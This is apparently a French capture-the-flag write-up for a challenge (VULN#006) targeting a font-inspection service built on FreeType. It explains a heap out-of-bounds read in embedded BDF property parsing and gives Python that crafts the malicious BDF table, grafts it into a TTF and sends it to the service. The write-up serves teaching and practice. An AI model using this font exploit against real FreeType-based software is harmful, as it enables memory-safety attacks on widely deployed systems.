# VULN#006 — FreeType BDF OOB Read

- **Catégorie :** vuln research
- **Points :** 98
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (protocole : 4 octets big-endian length prefix + font file)

## Contexte

Un service d'inspection de polices charge le fichier de font envoyé par le client et en lit
une métadonnée. Il est construit sur **FreeType**, la bibliothèque open-source de rendu de
polices utilisée par Android, iOS (via CoreText), Chrome, et de nombreuses applications.

**Protocole :** envoyer un préfixe de 4 octets big-endian indiquant la taille, suivi des
octets bruts du fichier de police. Le service répond avec le résultat de l'inspection.

## Analyse

### Bibliothèque ciblée : FreeType

L'énoncé mentionne « a real, unmodified, widely used open-source font rendering library,
the same engine Android's own system text renderer [...] is built on ». C'est FreeType
(libfreetype), le moteur de rasterisation de polices le plus déployé au monde.

### Surface d'attaque : table BDF embarquée

Les fichiers TrueType/OpenType sont des conteneurs de tables identifiées par des tags
de 4 octets. FreeType supporte une table optionnelle `BDF ` (Bitmap Distribution Format)
qui contient des propriétés (nom/valeur) pour les polices bitmap embarquées.

La vulnérabilité se situe dans le parsing des propriétés BDF : lorsqu'une propriété de
type « atom » (chaîne) référence un offset proche de la fin du bloc de strings, la
fonction `ft_memchr` (recherche du NUL terminal) dépasse les bornes du buffer alloué,
provoquant un **heap-buffer-overflow read**.

### Construction du fichier malveillant

1. **Base :** prendre un fichier TTF valide (DejaVu Sans Mono) pour avoir une structure
   TrueType correcte (header, table directory, tables essentielles).

2. **Injection de la table BDF :**

   ```
   Header BDF : version=0x0001, num_strikes=1, strings_offset=22
   Strike    : ppem=16, num_items=1
   Entry     : name_offset=0, type=0x10 (atom), value=62
   Strings   : "FOO\x00" + "A"*60
   ```

   Le champ `value` (62) pointe vers l'avant-dernier octet du bloc de strings. Quand
   FreeType cherche le NUL terminal à partir de cet offset, il lit au-delà du buffer
   alloué → OOB read.

3. **Assemblage :** reconstruire le fichier TTF avec toutes les tables originales plus
   la table `BDF ` ajoutée, en recalculant le table directory (offsets, checksums,
   searchRange, entrySelector, rangeShift).

## Méthode

### 1. Génération de la table BDF malveillante

```python
import struct

def build_bdf(pad=60):
    strings = b"FOO\x00" + b"A" * pad
    strings_off, name_off, typ = 22, 0, 0x10
    value = len(strings) - 2
    hdr = struct.pack(">HHI", 0x0001, 1, strings_off)
    strike = struct.pack(">HH", 16, 1)
    entry = struct.pack(">I", name_off) + struct.pack(">H", typ) + struct.pack(">I", value)
    return hdr + strike + entry + strings
```

Le `value` est calculé pour pointer 2 octets avant la fin du bloc de strings, forçant
`ft_memchr` à scanner au-delà des limites.

### 2. Reconstruction du TTF

- Lire une font base valide (ex: DejaVu) et parser son table directory.
- Ajouter la table `BDF ` avec le payload.
- Recalculer les checksums (`sum(u32be)` pour chaque table).
- Reconstruire le sfnt header (numTables, searchRange, entrySelector, rangeShift).
- Aligner chaque table sur 4 octets (padding NUL).

### 3. Envoi au service

```python
import socket, struct

data = make_font()
msg = struct.pack(">I", len(data)) + data
s = socket.create_connection(("<HOST>", <PORT>), timeout=10)
s.sendall(msg)
response = b""
while True:
    chunk = s.recv(8192)
    if not chunk:
        break
    response += chunk
s.close()
```

### 4. Résultat

```
status: crash confirmed (heap-buffer-overflow in embedded BDF property lookup)
FLAG: CTF{REDACTED}
```

Le service détecte le crash (via ASan ou un mécanisme similaire) et retourne le flag.

## Flux de la vulnérabilité

```
FT_Open_Face()
  → tt_face_load_bdf_props()
    → ft_property_string_list()
      → ft_memchr(strings + value, '\0', strings_len - value)
```

Quand `value ≈ strings_len`, le troisième argument est très petit (1-2 octets). Si le
NUL n'est pas trouvé dans cette fenêtre, `ft_memchr` continue à lire dans la mémoire
heap adjacente → heap-buffer-overflow read.

## Indicateurs

- Service qui charge des fichiers de police fournis par l'utilisateur.
- Mention de FreeType, HarfBuzz, ou « font rendering library ».
- Protocole binaire avec length-prefix (même pattern que VULN#004 et OT#004).

## Leçons

- Les parseurs de formats complexes (fonts, images, documents) sont une surface
  d'attaque classique — les tables optionnelles/obsolètes sont souvent moins testées.
- FreeType a eu de nombreuses CVE liées au parsing de tables (BDF, CFF, SFD, PCF).
- La technique « greffer une table malveillante sur un fichier valide » est réutilisable
  pour tout format de conteneur à tables (TTF/OTF, RIFF, IFF, etc.).
- Le protocole wire (4-byte BE length prefix + raw bytes) est un pattern récurrent
  sur cette plateforme CTF.

## Flag

```
CTF{REDACTED}
```

---

*Write-up par **Le_Geek** — BUG|PWN CTF · VULN#006.*
